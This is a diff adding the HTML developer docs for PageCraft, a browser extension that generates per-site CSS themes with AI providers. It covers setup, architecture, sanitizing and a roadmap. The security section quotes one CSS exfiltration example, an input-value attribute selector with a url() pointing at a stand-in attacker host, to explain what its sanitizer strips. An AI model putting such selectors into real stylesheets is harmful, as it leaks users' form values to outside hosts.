@@ -1,0 +1,289 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PageCraft Docs</title>
+<style>
+  :root {
+    --bg: #fbfbfa; --surface: #ffffff; --fg: #1d1f23; --muted: #646b75; --border: #e1e3e7;
+    --accent: #1458a6; --accent-soft: #e8f0fb; --done: #287d43; --done-soft: #e6f4ea;
+    --next: #a6530a; --next-soft: #fdf0e1; --later: #6b5aa8; --later-soft: #efecf9;
+    --code-bg: #f2f3f5;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #141619; --surface: #1b1e22; --fg: #e8eaed; --muted: #9aa1ab; --border: #30353c;
+      --accent: #8ab4f8; --accent-soft: #1d2a3d; --done: #81c995; --done-soft: #1a2e21;
+      --next: #f6ad55; --next-soft: #33261a; --later: #c4a7e7; --later-soft: #2a2438;
+      --code-bg: #23272d;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #141619; --surface: #1b1e22; --fg: #e8eaed; --muted: #9aa1ab; --border: #30353c;
+    --accent: #8ab4f8; --accent-soft: #1d2a3d; --done: #81c995; --done-soft: #1a2e21;
+    --next: #f6ad55; --next-soft: #33261a; --later: #c4a7e7; --later-soft: #2a2438;
+    --code-bg: #23272d;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0; background: var(--bg); color: var(--fg);
+    font: 15px/1.6 system-ui, -apple-system, "Segoe UI", sans-serif;
+  }
+  .layout { display: grid; grid-template-columns: 220px minmax(0, 1fr); max-width: 1120px; margin: 0 auto; gap: 40px; padding: 32px 24px 80px; }
+  nav { position: sticky; top: 24px; align-self: start; font-size: 14px; }
+  nav strong { display: block; font-size: 18px; margin-bottom: 4px; }
+  nav .ver { color: var(--muted); font-size: 12px; margin-bottom: 16px; display: block; }
+  nav a { display: block; color: var(--muted); text-decoration: none; padding: 3px 0; }
+  nav a:hover { color: var(--accent); }
+  main { min-width: 0; }
+  h1 { font-size: 30px; line-height: 1.2; margin: 0 0 8px; }
+  h2 { font-size: 21px; margin: 48px 0 12px; padding-top: 8px; border-top: 1px solid var(--border); }
+  h3 { font-size: 16px; margin: 24px 0 8px; }
+  p { margin: 0 0 12px; }
+  .lead { color: var(--muted); font-size: 17px; max-width: 70ch; }
+  a { color: var(--accent); }
+  code { font: 13px/1.4 ui-monospace, "Cascadia Code", Consolas, monospace; background: var(--code-bg); padding: 1px 5px; border-radius: 4px; }
+  pre { background: var(--code-bg); border-radius: 8px; padding: 14px 16px; overflow-x: auto; margin: 0 0 14px; }
+  pre code { background: none; padding: 0; }
+  table { width: 100%; border-collapse: collapse; margin: 0 0 16px; font-size: 14px; }
+  th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: .04em; }
+  .table-wrap { overflow-x: auto; }
+  .callout { border-left: 3px solid var(--next); background: var(--next-soft); padding: 10px 14px; border-radius: 0 6px 6px 0; margin: 0 0 16px; }
+  .callout.info { border-color: var(--accent); background: var(--accent-soft); }
+
+  /* flow diagram */
+  .flow { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 10px; margin: 8px 0 20px; counter-reset: step; }
+  .flow div { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 10px 12px; font-size: 13px; position: relative; }
+  .flow div::before { counter-increment: step; content: counter(step); display: inline-grid; place-items: center; width: 20px; height: 20px; border-radius: 50%; background: var(--accent-soft); color: var(--accent); font-size: 11px; font-weight: 700; margin-bottom: 4px; }
+  .flow b { display: block; font-size: 13px; }
+  .flow span { color: var(--muted); }
+
+  /* roadmap */
+  .summary { display: flex; flex-wrap: wrap; gap: 8px; margin: 0 0 16px; }
+  .pill { font-size: 12px; font-weight: 600; padding: 3px 10px; border-radius: 99px; }
+  .pill.done { color: var(--done); background: var(--done-soft); }
+  .pill.next { color: var(--next); background: var(--next-soft); }
+  .pill.later { color: var(--later); background: var(--later-soft); }
+  .phase { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 6px 16px 10px; margin: 0 0 16px; }
+  .phase h3 { display: flex; align-items: center; gap: 10px; }
+  .todo { list-style: none; padding: 0; margin: 0; }
+  .todo li { display: grid; grid-template-columns: 18px minmax(0, 1fr); gap: 10px; padding: 8px 0; border-top: 1px solid var(--border); }
+  .todo li:first-child { border-top: 0; }
+  .todo input { margin: 4px 0 0; accent-color: var(--done); }
+  .todo .t { font-weight: 600; }
+  .todo .d { color: var(--muted); font-size: 14px; }
+  .todo li.is-done .t { color: var(--muted); text-decoration: line-through; text-decoration-color: var(--border); }
+  .tag { font-size: 11px; font-weight: 600; color: var(--muted); border: 1px solid var(--border); border-radius: 4px; padding: 0 5px; margin-left: 6px; white-space: nowrap; }
+
+  @media (max-width: 820px) {
+    .layout { grid-template-columns: 1fr; gap: 16px; padding: 20px 16px 60px; }
+    nav { position: static; display: flex; flex-wrap: wrap; gap: 4px 14px; }
+    nav strong, nav .ver { width: 100%; margin: 0; }
+    .flow { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+<div class="layout">
+  <nav aria-label="Sections">
+    <strong>PageCraft</strong>
+    <span class="ver">v1.1.0 · developer docs</span>
+    <a href="#overview">Overview</a>
+    <a href="#setup">Setup &amp; build</a>
+    <a href="#usage">Using it</a>
+    <a href="#providers">AI providers</a>
+    <a href="#architecture">Architecture</a>
+    <a href="#generation">Generation pipeline</a>
+    <a href="#data">Data model</a>
+    <a href="#security">Security &amp; privacy</a>
+    <a href="#testing">Testing</a>
+    <a href="#roadmap">Roadmap &amp; to-do</a>
+  </nav>
+
+  <main>
+    <h1 id="overview">PageCraft</h1>
+    <p class="lead">A Chrome and Firefox (Manifest V3) extension that creates dedicated CSS themes for websites from plain-language instructions, using Anthropic, OpenAI, Gemini or a local model. You can also write and edit the CSS by hand.</p>
+
+    <div class="callout info">Generated output is <strong>CSS only</strong>. MV3 store policies forbid running remotely generated JavaScript, and CSS covers theming. Optional JS tweaks would need the opt-in <code>userScripts</code> API (see roadmap).</div>
+
+    <h2 id="setup">Setup &amp; build</h2>
+    <p>Requires <strong>Node.js 22+</strong> (WXT 0.21 needs it; Node 20 reached end-of-life in April 2026). The repo includes an <code>.nvmrc</code>.</p>
+<pre><code>npm install            # also runs `wxt prepare` (generates .wxt/ types)
+npm run dev            # Chrome with hot reload (opens a dev browser)
+npm run dev:firefox    # Firefox MV3 with hot reload
+npm run build          # → .output/chrome-mv3/
+npm run build:firefox  # → .output/firefox-mv3/
+npm run zip            # store-ready zip (add :firefox for AMO; also creates a sources zip)
+npm run compile        # type-check only</code></pre>
+    <h3>Load a build manually</h3>
+    <ul>
+      <li><strong>Chrome / Edge / Brave:</strong> <code>chrome://extensions</code> → Developer mode → <em>Load unpacked</em> → choose <code>.output/chrome-mv3</code>.</li>
+      <li><strong>Firefox:</strong> <code>about:debugging#/runtime/this-firefox</code> → <em>Load Temporary Add-on…</em> → choose <code>.output/firefox-mv3/manifest.json</code>.</li>
+    </ul>
+    <p>The manifest is generated from <code>wxt.config.ts</code> and the entrypoints. Don't edit <code>.output/</code>. The old <code>manifest.js</code> / <code>manifest.json</code> are gone.</p>
+
+    <h2 id="usage">Using it</h2>
+    <ol>
+      <li>Open <strong>AI settings</strong> from the popup. Pick a provider, add a key if it needs one, choose a model with <em>Load models</em>, press <em>Test connection</em>, then <em>Save</em>.</li>
+      <li>On any website, open the popup → <strong>CustomStyle editor</strong>. The editor opens in a new tab linked to the site's tab.</li>
+      <li>Describe the theme (e.g. “warm dark theme, amber accents, larger body text”) and press <strong>Generate</strong> or <kbd>Ctrl+Enter</kbd>. CSS streams into the editor, and <strong>Live preview</strong> shows it on the site tab.</li>
+      <li>Refine: with <strong>Refine current</strong> checked, the current CSS goes along with your next instruction so the model edits it instead of starting over.</li>
+      <li><strong>Save</strong> (<kbd>Ctrl+S</kbd>) stores the style and applies it to that hostname. The popup's <em>MyStyles</em> list lets you switch styles per site.</li>
+    </ol>
+    <p>Closing the editor drops the unsaved preview. The site goes back to its saved style.</p>
+
+    <h2 id="providers">AI providers</h2>
+    <div class="table-wrap"><table>
+      <thead><tr><th>Provider</th><th>Default base URL</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td>Anthropic</td><td><code>https://api.anthropic.com/v1</code></td><td>Uses <code>/messages</code> streaming. Sends <code>anthropic-dangerous-direct-browser-access: true</code>, which browser-origin requests need. Default model <code>claude-sonnet-5-5</code>.</td></tr>
+        <tr><td>OpenAI</td><td><code>https://api.openai.com/v1</code></td><td><code>/chat/completions</code> streaming. Works with any OpenAI-compatible service (OpenRouter, Groq, Together…) through a different base URL.</td></tr>
+        <tr><td>Gemini</td><td><code>https://generativelanguage.googleapis.com/v1beta</code></td><td><code>:streamGenerateContent?alt=sse</code>, key in the <code>x-goog-api-key</code> header. Thought parts are skipped.</td></tr>
+        <tr><td>Local</td><td><code>http://localhost:11434/v1</code></td><td>Any OpenAI-compatible server: Ollama, LM Studio (<code>http://localhost:1234/v1</code>), llama.cpp, vLLM. No key needed.</td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout"><strong>Ollama blocks extension origins by default</strong> (HTTP 403). Allow them, then restart Ollama:
+<pre><code># Windows (PowerShell, persistent)
+setx OLLAMA_ORIGINS "chrome-extension://*,moz-extension://*"
+# macOS
+launchctl setenv OLLAMA_ORIGINS "chrome-extension://*,moz-extension://*"
+# Linux (systemd): add Environment="OLLAMA_ORIGINS=..." via `systemctl edit ollama`</code></pre></div>
+    <p>Model lists are fetched live from each provider's models endpoint, so no model IDs are hardcoded beyond the Anthropic default.</p>
+
+    <h2 id="architecture">Architecture</h2>
+    <p>Built with <a href="https://wxt.dev">WXT</a> and TypeScript (no UI framework). AI requests go out from the <strong>extension pages</strong> (editor, settings), not from a background service worker. Extension pages get the same cross-origin access from <code>host_permissions</code>. Running there also avoids Chrome ending a long streaming request when an idle MV3 service worker is suspended, and keys never enter page context.</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>Path</th><th>Role</th></tr></thead>
+      <tbody>
+        <tr><td><code>wxt.config.ts</code></td><td>Manifest source: permissions, icons, Firefox <code>gecko</code> id (added to Firefox builds only).</td></tr>
+        <tr><td><code>entrypoints/content.ts</code></td><td>Runs on every page at <code>document_start</code>. Applies preset + legacy CSS + selected style (or live preview) in one <code>&lt;style&gt;</code>. Answers digest requests and accepts the preview port.</td></tr>
+        <tr><td><code>entrypoints/popup/</code></td><td>Toolbar popup: on/off, global preset, per-site style, open editor/settings.</td></tr>
+        <tr><td><code>entrypoints/editor/</code></td><td><code>editor.html</code>. <code>main.ts</code> handles style CRUD, generation and preview. <code>code-editor.ts</code> is the textarea editor behind a small API, so CodeMirror can replace it.</td></tr>
+        <tr><td><code>entrypoints/options/</code></td><td>AI settings page: provider, key, base URL, model list, connection test.</td></tr>
+        <tr><td><code>lib/storage.ts</code></td><td>Typed access to <code>storage.local</code> (themes and AI settings) with defaults.</td></tr>
+        <tr><td><code>lib/ai/providers.ts</code></td><td>Provider layer: one <code>streamText()</code> API over three wire formats, SSE parser, <code>listModels()</code>, helpful error hints.</td></tr>
+        <tr><td><code>lib/ai/prompt.ts</code></td><td>System prompt (theming rules) and user message builder.</td></tr>
+        <tr><td><code>lib/ai/sanitize.ts</code></td><td>Extracts CSS from model output and strips external references (see <a href="#security">security</a>).</td></tr>
+        <tr><td><code>lib/digest.ts</code></td><td>Builds the compact page description sent to the model.</td></tr>
+        <tr><td><code>lib/messages.ts</code></td><td>Message and port contracts between pages and the content script.</td></tr>
+      </tbody>
+    </table></div>
+
+    <h2 id="generation">Generation pipeline</h2>
+    <div class="flow">
+      <div><b>Digest</b><span>Content script describes the page with PageCraft's own sheet off.</span></div>
+      <div><b>Prompt</b><span>System rules + digest + current CSS (when refining) + instructions.</span></div>
+      <div><b>Stream</b><span>Provider streams text. The editor shows the extracted CSS live.</span></div>
+      <div><b>Sanitize</b><span>Strip <code>@import</code> and external <code>url()</code>, then re-parse in the browser.</span></div>
+      <div><b>Preview → Save</b><span>Applied to the tab over a port. Saved only on explicit Save.</span></div>
+    </div>
+    <h3>Page digest contents</h3>
+    <p>URL (origin + path, no query string), title, language, declared <code>color-scheme</code>, up to 80 <code>:root</code> CSS custom properties, the main background and text colors, fonts, and a DOM outline (max 220 lines, depth 9). The outline lists <code>tag#id.class [role aria-label data-*]</code>, collapses repeated siblings (<code>li ×24</code>) and leaves out hashed class names. No text content or form values are included.</p>
+    <h3>Prompt rules (summary)</h3>
+    <p>Output one <code>```css</code> block. Override site CSS variables first. Use stable selectors (roles, attributes, semantic classes). Keep WCAG AA contrast. Don't hide content. Style hover/focus states, forms, code and tables. No remote resources. When refining, return the full updated stylesheet.</p>
+
+    <h2 id="data">Data model</h2>
+    <p>Everything lives in <code>browser.storage.local</code> (never <code>sync</code>):</p>
+<pre><code>enabled: boolean                    // global on/off
+preset: "none" | "dark" | "light"
+styles: { [hostname]: css }         // legacy 1.0 per-host CSS, still applied
+myStyles: [{ id, name, css, prompt?, updatedAt? }]
+selectedMyStyles: { [hostname]: styleId }
+ai: {
+  activeProvider: "anthropic" | "openai" | "gemini" | "local",
+  providers: { [id]: { apiKey, baseUrl, model } }
+}</code></pre>
+    <p>The content script refreshes only when a theme key changes. Saving AI settings doesn't re-render pages.</p>
+
+    <h2 id="security">Security &amp; privacy</h2>
+    <ul>
+      <li><strong>CSS data leaks.</strong> CSS can send page data out, e.g. <code>input[value^="a"] { background: url(https://attacker/a) }</code>. Generated CSS therefore has <code>@import</code>, every non-<code>data:</code> <code>url()</code>, external <code>image-set()</code> strings, <code>-moz-binding</code>/<code>behavior</code> and <code>expression()</code> removed. It is then re-parsed with <code>CSSStyleSheet.replaceSync</code>. If anything external is left after that (e.g. hidden with CSS escapes), the normalized output is used and stripped again. A warning lists the fixes.</li>
+      <li>CSS you type by hand is <em>not</em> sanitized. It's yours.</li>
+      <li><strong>API keys</strong> are stored unencrypted in extension-local storage and sent only to the configured base URL. Web pages can't read extension storage.</li>
+      <li><strong>Data sent</strong> on Generate: instructions, current CSS (if refining), page digest. The settings page says this too. This replaces the 1.0 “no network requests” claim.</li>
+      <li>Permissions: <code>storage</code>, <code>activeTab</code>, <code>&lt;all_urls&gt;</code> host access (applying themes + calling provider APIs, localhost included). Narrowing these is on the roadmap.</li>
+    </ul>
+
+    <h2 id="testing">Testing</h2>
+    <p>Automated: <code>npm run compile</code> (strict TypeScript) and both browser builds pass. Unit tests aren't set up yet. Manual smoke test, per browser:</p>
+    <ol>
+      <li>Global preset applies to HTTP(S) pages. Toggling PageCraft off removes all PageCraft CSS.</li>
+      <li>Hand-written style saves, applies to its hostname and survives reload. Data from 1.0 still applies.</li>
+      <li>For each provider: Load models → Test connection → Generate on a real site (e.g. Wikipedia, GitHub). CSS streams, preview updates the tab, Save persists it.</li>
+      <li>Stop mid-generation keeps the partial CSS unsaved. A bad key shows a readable error.</li>
+      <li>Refine: a second instruction changes only what you asked for.</li>
+      <li>Close the editor without saving: the tab goes back to the saved style.</li>
+      <li>Ollama without <code>OLLAMA_ORIGINS</code> shows the 403 hint.</li>
+    </ol>
+
+    <h2 id="roadmap">Roadmap &amp; to-do</h2>
+    <div class="summary" id="summary"></div>
+
+    <section class="phase">
+      <h3>Phase 1: Essentials <span class="pill done">done</span></h3>
+      <ul class="todo">
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Migrate to WXT + TypeScript</div><div class="d">One codebase builds Chrome MV3 and Firefox MV3. Generated manifests. All 1.0 features kept.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Provider layer for Anthropic, OpenAI, Gemini, local</div><div class="d">Streaming, model listing, connection test, error hints (401/403, Ollama origins).</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">AI settings page</div><div class="d">Per-provider key/base URL/model, remembered while switching providers.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Page digest, theming prompt and CSS sanitizer</div><div class="d">Replaces the ComfyUI placeholder (ComfyUI is for images, not text→CSS).</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Live preview, refine and stop</div><div class="d">Preview over a port, cleared when the editor closes.</div></div></li>
+      </ul>
+    </section>
+
+    <section class="phase">
+      <h3>Phase 2: Harden what exists <span class="pill next">next</span></h3>
+      <ul class="todo">
+        <li><input type="checkbox" disabled><div><div class="t">Manual smoke test in Chrome and Firefox with every provider <span class="tag">blocker</span></div><div class="d">Builds pass, but no real browser test has run yet. Follow the <a href="#testing">checklist</a>.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Undo / version history for generations <span class="tag">high</span></div><div class="d">Replacing the textarea value clears native undo. Keep the last N versions per style plus a “Revert” button.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Inject into tabs that were open before install <span class="tag">high</span></div><div class="d">Those tabs have no content script, so digest and preview fail until reload. Add the <code>scripting</code> permission and inject on demand.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Firefox host-permission check <span class="tag">high</span></div><div class="d">Firefox lets users withhold <code>&lt;all_urls&gt;</code>. Check with <code>permissions.contains</code> and ask from the popup.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Unit tests with Vitest + WXT testing plugin</div><div class="d">Cover <code>extractCss</code>, <code>sanitizeCss</code> (escape tricks), SSE parsing per provider (recorded fixtures), prompt building.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">AST-based sanitizer with css-tree</div><div class="d">Swap the regex + re-parse approach for an allow-list walk of the CSS tree.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Resize the icon</div><div class="d"><code>icon.png</code> is 1.16 MB. Ship 16/32/48/128 px PNGs (stores reject oversized assets).</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Firefox AMO metadata</div><div class="d">Add <code>data_collection_permissions</code> to <code>gecko</code> settings (required for new AMO listings) and state that data goes to AI providers.</div></div></li>
+      </ul>
+    </section>
+
+    <section class="phase">
+      <h3>Phase 3: Better themes <span class="pill later">later</span></h3>
+      <ul class="todo">
+        <li><input type="checkbox" disabled><div><div class="t">Replace the editor with CodeMirror 6</div><div class="d">Implement the same <code>CssEditor</code> API (value, onChange, setReadOnly). Adds lint, real undo, search, color swatches.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Two-step generation: design tokens → CSS</div><div class="d">Model writes a JSON palette/typography/radius first, then maps it to the site. Add a token editor to tweak colors without regenerating.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Conversation-style refinement</div><div class="d">Keep the instruction history per style and send recent turns. Show it as a chat in the editor.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Screenshot input for vision models</div><div class="d"><code>tabs.captureVisibleTab</code>, opt-in, downscaled. Then a “check my theme” pass that critiques a screenshot of the result.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Contrast checker</div><div class="d">Measure text/background contrast on the previewed page and feed failures back into a fix-up prompt.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Better injection</div><div class="d"><code>@layer pagecraft</code>, <code>all_frames</code> for iframes, open Shadow DOM roots, single-page-app route changes.</div></div></li>
+      </ul>
+    </section>
+
+    <section class="phase">
+      <h3>Phase 4: Product polish <span class="pill later">later</span></h3>
+      <ul class="todo">
+        <li><input type="checkbox" disabled><div><div class="t">Host patterns and global themes</div><div class="d">Match <code>*.example.com</code>, path rules, or apply a theme everywhere.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Import / export themes as JSON</div><div class="d">Backup, sharing, and later a community gallery.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Narrower permissions</div><div class="d">Ask for site and provider hosts at runtime (<code>optional_host_permissions</code>) instead of <code>&lt;all_urls&gt;</code>. Faster store review.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Optional API key encryption</div><div class="d">Passphrase-derived key (PBKDF2 + AES-GCM through WebCrypto), unlocked once per session.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Token and cost estimate before sending</div><div class="d">Show digest size, plus a setting for the digest budget.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">CI and store publishing</div><div class="d">GitHub Actions: compile, test, <code>wxt zip</code> for both browsers. <code>wxt submit</code> to the Chrome Web Store and AMO.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Localisation (i18n)</div><div class="d">Use WXT's i18n module for UI strings.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Optional JavaScript tweaks via <code>userScripts</code></div><div class="d">Only if needed. The user must enable it in the browser, and it needs separate review. CSS stays the default.</div></div></li>
+      </ul>
+    </section>
+  </main>
+</div>
+<script>
+  // Count roadmap items so the summary pills stay accurate as the list is edited.
+  const items = [...document.querySelectorAll(".todo li")];
+  const done = items.filter((li) => li.classList.contains("is-done")).length;
+  const pills = [
+    ["done", `${done} done`],
+    ["next", `${items.length - done} open`],
+  ];
+  document.getElementById("summary").innerHTML = pills
+    .map(([cls, text]) => `<span class="pill ${cls}">${text}</span>`).join("");
+</script>
+</body>
+</html>
